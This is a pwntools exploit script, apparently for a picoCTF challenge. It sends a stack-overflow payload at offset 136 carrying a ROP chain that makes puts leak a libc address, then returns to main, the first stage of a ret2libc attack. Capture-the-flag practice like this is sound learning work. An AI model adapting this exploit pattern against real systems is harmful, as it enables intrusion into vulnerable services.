#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

gdbscript = '''
b *0x400913
continue
'''.format(**locals())

def conn():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    elif args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
            print("attaching")
    else:
        r = remote("mercury.picoctf.net", 23584)

    return r


def main():
    r = conn()
    rop = ROP([exe,libc])
    
    PUTS = exe.plt['puts']
    MAIN = exe.symbols['main']
    LIBC_START_MAIN = exe.symbols['__libc_start_main']

    rop.rdi = LIBC_START_MAIN
    rop.call(PUTS)
    rop.call(MAIN)

    payload = fit({
        136: rop.chain(),
    })
    log.info(f"sending payload: {payload}")
    log.info(f"rop chain:\n{rop.dump()}")
    r.sendlineafter(b"sErVeR!", payload)
    r.recvline()
    r.recvline()
    resp = u64(r.recvline().strip().ljust(8,b'\x00'))
    log.info(f"Addr: {resp:X}")

    r.interactive()
    # r.wait()

    core = r.corefile
    # pattern = core.read(core.rsp, 4)
    # log.info(f"pattern is: {pattern}")
    # log.info(f"offset: {cyclic_find(pattern)}")


if __name__ == "__main__":
    main()
